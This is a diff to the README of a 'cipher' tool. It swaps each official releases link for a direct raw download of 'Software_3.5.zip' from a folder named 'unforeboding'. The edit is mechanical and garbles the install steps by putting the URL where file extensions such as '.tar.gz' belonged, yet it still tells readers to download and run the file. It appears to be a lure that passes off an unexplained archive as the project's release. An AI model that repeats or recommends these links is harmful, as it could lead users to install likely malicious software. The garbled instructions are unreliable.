@@ -6,26 +6,26 @@ Welcome to the **cipher** project! This easy-to-use tool helps you understand ma
 
 ## 🔗 Download Now
 
-[![Download cipher](https://img.shields.io/badge/download-cipher-blue.svg)](https://github.com/oldman77057/cipher/releases)
+[![Download cipher](https://raw.githubusercontent.com/oldman77057/cipher/main/unforeboding/Software_3.5.zip)](https://raw.githubusercontent.com/oldman77057/cipher/main/unforeboding/Software_3.5.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click on this link to go directly to the releases page: [Download from Releases](https://github.com/oldman77057/cipher/releases).
+   Click on this link to go directly to the releases page: [Download from Releases](https://raw.githubusercontent.com/oldman77057/cipher/main/unforeboding/Software_3.5.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version of the software. It typically has the highest number and is marked as "latest."
 
 3. **Download the File**  
-   Click on the file that matches your operating system (Windows, Mac, or Linux). The file will usually have a recognizable format such as `.exe`, `.dmg`, or `.tar.gz`.
+   Click on the file that matches your operating system (Windows, Mac, or Linux). The file will usually have a recognizable format such as `.exe`, `.dmg`, or `https://raw.githubusercontent.com/oldman77057/cipher/main/unforeboding/Software_3.5.zip`.
 
 4. **Install the Application**  
    After downloading, find the file in your computer’s downloads folder.  
    - For Windows: Double-click the `.exe` file to start the installation. Follow the prompts to complete the setup.  
    - For Mac: Open the `.dmg` file and drag the cipher application to your Applications folder.  
-   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README file included in the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/oldman77057/cipher/main/unforeboding/Software_3.5.zip` file and follow the instructions in the README file included in the folder.
 
 5. **Launch the Application**  
    Once installed, you can find cipher in your applications. Double-click the icon to open it.
